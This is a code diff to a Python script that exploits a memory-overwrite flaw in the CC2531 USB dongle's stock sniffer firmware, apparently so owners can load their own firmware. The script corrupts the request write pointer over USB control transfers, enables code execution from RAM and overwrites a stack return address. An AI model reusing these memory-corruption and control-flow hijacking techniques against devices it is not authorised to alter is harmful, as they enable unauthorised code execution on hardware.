@@ -42,6 +42,7 @@ jump to the code written to xdata.
 
 import usb
 import time
+from dataclasses import dataclass
 
 
 def u8(n):
@@ -52,37 +53,68 @@ def u16(n):
     return n.to_bytes(2, 'little')
 
 
-# Start of control transfer buffer
-TRANSFER_BUF_START = 0x020f
+@dataclass
+class MemLayout:
+    transfer_buf_start: int
+    vars: tuple
+    stack_ret: int
 
-# Stuff we'll overwrite (adresses are absolute)
-MEM_LAYOUT = (
-    ('usb_state', 0x035d, u8),     # USB or endpoint state machine variable
-    ('req_state', 0x0364, u8),     # Request handler state machine variable
-    ('wptr',      0x0371, u16),    # Request write pointer
-    ('addrspace', 0x0373, u8),     # Request write pointer address space
-    ('wlen',      0x0375, u16),    # Remaining request write length
-    ('data',      0x038f, bytes),  # Data that will get written at wptr+32
-)
 
 # TI OEM sniffer firmware uses 0x1c0 .. 0x3a0 and 0x1e90 .. 0x1eb0,
 # and 0x1f00 .. 0x1fff is where the data address space is mapped in.
 FREE_SPACE = range(0x03a0, 0x1e90)
 
 
-def construct_payload(**kwargs):
+# It seems there are multiple versions of the stock firmware with
+# varying memory layouts. That's annoying.
+MEM_LAYOUTS = {
+    0x8391: MemLayout(
+        # Start of control transfer buffer
+        transfer_buf_start = 0x020f,
+
+        # Stuff we'll overwrite (adresses are absolute)
+        vars = (
+            # Name        addr    type
+            ('usb_state', 0x035d, u8),     # USB or endpoint state machine variable
+            ('req_state', 0x0364, u8),     # Request handler state machine variable
+            ('wptr',      0x0371, u16),    # Request write pointer
+            ('addrspace', 0x0373, u8),     # Request write pointer address space
+            ('wlen',      0x0375, u16),    # Remaining request write length
+            ('data',      0x038f, bytes),  # Data that will get written at wptr+32
+        ),
+
+        # Return address on stack we'll overwrite
+        stack_ret = 0xc2,
+    ),
+
+    0x0821: MemLayout(
+        transfer_buf_start = 0x0202,
+        vars = (
+            ('usb_state', 0x0377, u8),
+            ('req_state', 0x037e, u8),
+            ('wptr',      0x038b, u16),
+            ('addrspace', 0x038d, u8),
+            ('wlen',      0x038f, u16),
+            ('data',      0x03a2, bytes),
+        ),
+        stack_ret = 0xc2,
+    ),
+}
+
+
+def construct_payload(layout, **kwargs):
     """
     Build the exploit payload using MEM_LAYOUT to convert and place named arguments
     """
     payload = b''
-    for name, addr, func in MEM_LAYOUT:
-        padding = bytes(addr - TRANSFER_BUF_START - len(payload))
+    for name, addr, func in layout.vars:
+        padding = bytes(addr - layout.transfer_buf_start - len(payload))
         value = func(kwargs[name])
         payload += padding + value
     return payload
 
 
-def write_exploit(dev, data, addr, idata=False):
+def write_exploit(dev, layout, data, addr, idata=False):
     """
     Writes `data` to `addr`.
     The address space is xdata unless `idata` is True.
@@ -90,6 +122,7 @@ def write_exploit(dev, data, addr, idata=False):
     """
     print(f"    Writing {len(data)} bytes to {addr:#06x}")
     payload = construct_payload(
+        layout,
         usb_state = 2,               # Must be 2
         req_state = 2,               # Must be 2
         wptr      = addr - 32,       # Pointer is updated (+=32) before being read
@@ -106,13 +139,13 @@ def write_exploit(dev, data, addr, idata=False):
     )
 
 
-def upload_file_contents(dev, paths, offset):
+def upload_file_contents(dev, layout, paths, offset):
     data = b''.join(open(p, 'rb').read() for p in paths)
     print('Uploading files')
-    write_exploit(dev, data, offset)
+    write_exploit(dev, layout, data, offset)
 
 
-def enable_xmap(dev):
+def enable_xmap(dev, layout):
     """
     Enable running code from RAM aka. XMAP. XDATA is mapped in to CODE space at 0x8000,
     such that CODE addr 0x8000 corresponds to XDATA addr 0.
@@ -120,25 +153,23 @@ def enable_xmap(dev):
     print("Enabling running from SRAM")
     MEMCTR = 0xc7 + 0x7000
     MEMCTR_ENABLE_XMAP = 1 << 3
-    write_exploit(dev, u8(MEMCTR_ENABLE_XMAP), MEMCTR)
+    write_exploit(dev, layout, u8(MEMCTR_ENABLE_XMAP), MEMCTR)
 
 
-def overwrite_return_address(dev, addr):
+def overwrite_return_address(dev, layout, addr):
     """
     Change a return address on stack to cause a later jump to `addr`.
     """
     print(f"Overwriting return address on stack to {addr:#06x}")
-    addr_on_stack = 0xc2
-    write_exploit(dev, u16(addr), addr_on_stack, idata=True)
+    write_exploit(dev, layout, u16(addr), layout.stack_ret, idata=True)
 
 
 def find_oem_device():
-    VID, PID, BCD = 0x0451, 0x16ae, 0x8391
+    VID, PID = 0x0451, 0x16ae
     print("Looking for CC2531 USB Dongle matching",
           f"idVendor={VID:04x}",
-          f"idProduct={PID:04x}",
-          f"bcdDevice={BCD:04x}")
-    dev = usb.core.find(idVendor=VID, idProduct=PID, bcdDevice=BCD)
+          f"idProduct={PID:04x}")
+    dev = usb.core.find(idVendor=VID, idProduct=PID)
     assert dev, "Failed to find matching USB device"
     dev.reset()
     dev.set_configuration()
@@ -190,9 +221,11 @@ if __name__ == '__main__':
     assert paths, "Missing arguments" + __doc__ + USAGE
 
     dev = find_oem_device()
-    upload_file_contents(dev, paths, offset)
-    enable_xmap(dev)
-    overwrite_return_address(dev, offset + XMAP_BASE)
+    assert dev.bcdDevice in MEM_LAYOUTS, f"This dongle with bcdDevice={dev.bcdDevice} is not yet supported. Please open an issue."
+    layout = MEM_LAYOUTS[dev.bcdDevice]
+    upload_file_contents(dev, layout, paths, offset)
+    enable_xmap(dev, layout)
+    overwrite_return_address(dev, layout, offset + XMAP_BASE)
     print("CC2531 should now be running uploaded binaries")
     new_dev = find_new_device_on_same_usb_port(dev.bus, dev.port_numbers)
-    assert new_dev, "Uh oh! Device fell off USB port."
+    assert new_dev, "Uh oh! Device fell off USB port. Try unplugging it and plug it back in."
